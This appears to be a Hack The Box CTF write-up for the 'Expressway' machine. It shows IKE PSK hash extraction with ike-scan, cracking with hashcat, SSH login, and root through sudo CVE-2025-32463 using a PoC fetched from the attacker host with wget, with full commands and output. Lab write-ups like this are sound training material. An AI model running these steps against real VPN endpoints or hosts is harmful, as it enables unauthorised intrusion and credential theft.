/CbEZo7VxBU6N8y2mfJ7UTI7I5DZ5NImTThPiI4tO4wr24QoADhxPrlRzRTy2TIZbWizURA9+hn0izgyF5lbUg3eTRjdZtMGZ7K9Hk23zeeYsPErm8dR8zUWCU0UWAuwC+AZ7m5Q5n16ByP/2keZxmfEszxq4xrMn4ZIPpHA8Ah5f/V+pJDqAyW4CZlSflRtIrQisFP04=
-iv: ZWNo7pN43YZej9MKx+8d9w==
-salt: 9UxlyUyzm5etAxYjT+Y33w==
-hmac: wJ7/EZ76ObPri+T5KMTH0xg4WXoRJUbsjAg3cVVNzwA=
+---
+title: "ExpressWay"
+date: 21-09-2025 
+categories: [Linux, Linux Easy, Active]
+tags: [UDP, Password Cracking, Sudo, IPsec, IKE]
+image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
+---
+
+Expressway is an easy Linux box. A quick nmap shows that the only TCP port that is open is SSH, which limits our attack path significantly. Looking over at the UDP ports we can find that port 500 is open which is running IPsec/IKE which is a VPN. This service is missconfigured which lets us read the hash for the user. This hash can be cracked and we get a clear text password. We can ssh to the box thanks to the username being leaked and the password we just cracked. Inside the box we can find that the sudo version is vulnerable to a recent exploit which lets us get root.
+
+![expressway_info_card](/assets/images/expressway/Expressway.png)
+
+## Nmap
+
+As always we can start with the classic nmap scan which will show us which TCP ports are open. Surprisingly only one port is open which is for the SSH service.
+
+```
+nmap 10.129.51.72 -p- --min-rate 5000 -n -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:37 CEST
+
+Not shown: 65493 closed tcp ports (reset), 41 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+```
+
+We can use the -V flag to enumerate the version of ssh which shows that it is up-to-date and it is not vulnerable to any known exploits
+```
+nmap 10.129.51.72 -sCV -p 22 -n -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 11:00 CEST
+Nmap scan report for 10.129.51.72
+Host is up (0.073s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh    !!OpenSSH 10.0p2 Debian 8 (protocol 2.0)!!
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+## Finding the UDP Service
+Since we have not found an entry point yet, I ran a UDP scan to see if we get any open ports there. I recommend running the scan with the verbose flag. This is because a UDP scan can take a very long time and with the verbose flag it will show us when a port is open without needing to wait until the entire scan is done.
+
+```
+sudo nmap 10.129.51.72 -sUCV -p 500 -n -Pn -v
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:40 CEST
+<SNIP>
+Scanning 10.129.51.72 [1 port]
+!!Discovered open port 500/udp on 10.129.51.72!!
+Completed UDP Scan at 10:40, 0.15s elapsed (1 total ports)
+```
+
+Port 500 is open but we do not get a lot of info so I reran the scan with the C and V flags to enumerate the versions and run default scripts on the service.
+```
+sudo nmap 10.129.51.72 -sUCV -p 500 -n -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:40 CEST
+Nmap scan report for 10.129.51.72
+Host is up.
+
+PORT    STATE SERVICE VERSION
+500/udp open  isakmp?
+| ike-version: 
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 134.46 seconds
+```
+
+## Enumerating IKE and Obtaining the Hash
+I personally did not know about this service but a quick search in [Hacktricks](https://book.hacktricks.wiki/en/index.html) shows some interesting guides on how to exploit this service.
+
+![expressway_info_card](/assets/images/expressway/hacktricks.png)
+
+We can run the `ike-scan` tool to view information about the server
+```
+sudo ike-scan -M 10.129.51.72
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.51.72	Main Mode Handshake returned
+	HDR=(CKY-R=96e84893280c8e9b)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.052 seconds (19.15 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+We can see that in the last line we have `1 returned handshake; 0 returned notify`
+
+quoting the hacktricks page:
+1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output).
+
+We can keep following the guide and the next step is to retrieve the hash, which can be done using the following command:
+```
+sudo ike-scan -P -M -A -n fakeID 10.129.51.72
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.51.72	Aggressive Mode Handshake returned
+	HDR=(CKY-R=6d0fd1d4873d4b6a)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	KeyExchange(128 bytes)
+	Nonce(32 bytes)
+	ID(Type=ID_USER_FQDN, Value=i!!ke@expressway.htb!!)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+	Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134be6b544f304008c03bf212d6a4cd4ec29b98e2bc142ce711c11939559bea8971c011208277fd9063cbd22dd1cd4d6786a120d54b6e256659ca85d5481be02f595240cf8255d0e20d271b22433de19e01cc631b765a14dbc30885aca96e540d7f1c504298f3e5a:5d6b489bb19dd7777021b350119c734ea30bca47a261192f8520664fddfd056e1465574f533bd74babec637f0468b24a2ea08299b5dda6e5db507b9e84d098e7f48c4ceda92db52a2e355197a0a7a29152851c5b4eba12a6cabf498d1275a8f39d0b364296c8a46f81685aa48749d6ddb26a2eff8524ccd3fe971e485de4fb8c:6d0fd1d4873d4b6a:dcad1a4e4470408d:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9853736e7f1db80ee7e557d56a30bbefb757ca61:d4a397424bb123d0f07ae1c1e5c32035edcf2c9d177f6416f7b24470513e4840:372ca8d7089461ecce39f007ac3acb556d6dc5e8
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.051 seconds (19.71 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+## Cracking the Hash
+The commmand was ran using a fakeID but we still got the hash. The guide says that if we get a hash with a non valid ID it may not be the correct hash, but this only happens in modern versions. I believe this hash is correct because we can see that the value is `ike@expressway.htb` which is the hostname of this box and it is very probable that this hash comes from the ssh password for the `ike` user. In the case that we would have not gotten the hash we could have tried to brute force the IDs until we got a hash.
+
+I saved the hash value into a file and then used hashcat to crack it.
+```sh
+vim ike.hash # saving the hash to a file
+hashcat ike.hash /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting in autodetect mode
+
+<SNIP>
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134be6b544f304008c03bf212d6a4cd4ec29b98e2bc142ce711c11939559bea8971c011208277fd9063cbd22dd1cd4d6786a120d54b6e256659ca85d5481be02f595240cf8255d0e20d271b22433de19e01cc631b765a14dbc30885aca96e540d7f1c504298f3e5a:
+5d6b489bb19dd7777021b350119c734ea30bca47a261192f8520664fddfd056e1465574f533bd74babec637f0468b24a2ea08299b5dda6e5db507b9e84d098e7f48c4ceda92db52a2e355197a0a7a29152851c5b4eba12a6cabf498d1275a8f39d0b364296c8a46f81685aa48749d6ddb26a2eff8524ccd3fe971e485de4fb8c:
+6d0fd1d4873d4b6a:dcad1a4e4470408d:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c00040000708003000024030100008001000180020002800300018004000
+2800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:9853736e7f1db80ee7e557d56a30bbefb757ca61:d4a397424bb123d0f07ae1c1e5c32035edcf2c9d177f6416f7b24470513e4840:372ca8d70894
+61ecce39f007ac3acb556d6dc5e8:!!freakingrockstarontheroad!!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5400 (IKE-PSK SHA1)
+Hash.Target......: ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134...6dc5e8
+Time.Started.....: Sun Sep 21 11:23:47 2025 (14 secs)
+Time.Estimated...: Sun Sep 21 11:24:01 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   442.5 kH/s (0.42ms) @ Accel:138 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8045676/14344385 (56.09%)
+Rejected.........: 0/8045676 (0.00%)
+Restore.Point....: 8044848/14344385 (56.08%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: freako123 -> frdwg!
+Hardware.Mon.#1..: Util: 25%
+
+Started: Sun Sep 21 11:23:44 2025
+Stopped: Sun Sep 21 11:24:03 2025
+```
+
+The password cracks and have the credentials for the user ike. Since the SSH port was open we can try to login in.
+```sh
+ssh ike@10.129.51.72
+ike@10.129.51.72's password: 
+
+Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Sep 21 10:28:12 2025 from 10.10.14.145
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+```
+
+We get logged in and we can read the user flag. 
+
+## Privilege Escalation
+It took me a while to find the correct path. Turns out it was quite easy, I even watched a [video](https://www.youtube.com/watch?v=9nRr3R9gEb8) about this vulnerability when it came out but I never thought it would be included in this box. 
+The vulnerability I am talking about is [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463), which affects the sudo binary. Versions before 1.9.17p1 allow local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.
+
+We can see from the output below that the sudo version on this machine is vulnerable and we can easily get root.
+```sh
+ike@expressway:~$ sudo -V
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+```
+
+I used this [poc](https://github.com/MohamedKarrab/CVE-2025-32463) which I transfered to the vulnerable machine using wget:
+First download the exploit to your machine, then set up a python web server
+```sh
+git clone https://github.com/MohamedKarrab/CVE-2025-32463
+
+sudo python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+On the vulnerable server use wget recursively to download the entire directory:
+
+```sh
+wget -r http://10.10.14.145/CVE-2025-32463
+--2025-09-21 10:38:20--  http://10.10.14.145/CVE-2025-32463
+Connecting to 10.10.14.145:80... connected.
+
+<SNIP>
+
+FINISHED --2025-09-21 10:38:23--
+Total wall clock time: 2.9s
+Downloaded: 19 files, 368K in 0.6s (600 KB/s)
+```
+
+We can now chmod the binary to give it execution priveleges and run it which will give us root acess
+```sh
+ike@expressway:~$ cd CVE-2025-32463/
+ike@expressway:~/CVE-2025-32463$ chmod +x get_root.sh
+ike@expressway:~/CVE-2025-32463$ ./get_root.sh
+[*] Detected architecture: x86_64
+[*] Launching sudo with archs-dynamic payload …
+root@expressway:/# id
+uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
+root@expressway:/# cat /root/root.txt
+f4b95eee70f7<SNIP>
+```
